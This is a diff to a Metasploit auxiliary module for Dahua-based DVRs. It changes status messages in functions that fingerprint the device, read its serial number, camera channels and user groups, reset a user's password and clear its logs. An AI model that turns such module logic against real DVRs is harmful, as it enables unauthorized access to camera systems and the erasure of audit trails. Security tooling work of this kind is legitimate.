@@ -82,7 +82,7 @@ class Metasploit3 < Msf::Auxiliary
     data = sock.get_once
     if data =~ /[\x00]{8,}([[:print:]]+)/
       ver = Regexp.last_match[1]
-      print_status("Version: #{ver} @ #{rhost}:#{rport}!")
+      print_good("#{peer} -- version: #{ver}")
     end
   end
 
@@ -91,7 +91,7 @@ class Metasploit3 < Msf::Auxiliary
     data = sock.get_once
     if data =~ /[\x00]{8,}([[:print:]]+)/
       serial = Regexp.last_match[1]
-      print_status("Serial Number: #{serial} @ #{rhost}:#{rport}!")
+      print_good("#{peer} -- serial number: #{serial}")
     end
   end
 
@@ -185,7 +185,7 @@ class Metasploit3 < Msf::Auxiliary
     data = sock.get_once.split('&&')
     disconnect
     if data.length > 1
-      print_status("Camera Channels @ #{rhost}:#{rport}!:")
+      print_good("#{peer} -- camera channels:")
       data.each_with_index { |val, index| print_status("  #{index + 1}:#{val[/([[:print:]]+)/]}") }
     end
   end
@@ -224,7 +224,7 @@ class Metasploit3 < Msf::Auxiliary
     connect
     sock.put(GROUPS)
     if data = sock.get_once.split('&&')
-      print_status("User Groups: @ #{rhost}:#{rport}!")
+      print_good("#{peer} -- groups:")
       data.each { |val| print_status("  #{val[/(([\d]+)[:]([\w]+))/]}") }
     end
   end
@@ -243,14 +243,18 @@ class Metasploit3 < Msf::Auxiliary
     data = sock.get_once
     sock.put(u1)
     if data = sock.get_once
-      print_good("PASSWORD RESET!: user #{datastore['USERNAME']}'s password reset to #{datastore['PASSWORD']}! @ #{rhost}:#{rport}!")
+      print_good("#{peer} -- user #{datastore['USERNAME']}'s password reset to #{@password}")
     end
   end
 
   def clear_logs
     sock.put(CLEAR_LOGS1)
     sock.put(CLEAR_LOGS2)
-    print_good("LOGS CLEARED! @ #{rhost}:#{rport}")
+    print_good("#{peer} -- logs cleared")
+  end
+
+  def peer
+    "#{rhost}:#{rport}"
   end
 
   def run_host(ip)
@@ -262,9 +266,9 @@ class Metasploit3 < Msf::Auxiliary
     data = sock.recv(8)
     disconnect
     if data == DVR_RESP
-      print_good("DVR FOUND: @ #{rhost}:#{rport}!")
+      print_good("#{peer} -- Dahua-based DVR found")
       report_service(host: rhost, port: rport, sname: 'dvr', info: "Dahua-based DVR")
-      # needs boolean logic to run or not run
+
       if datastore['VERSION_INFO']
         grab_version
       end
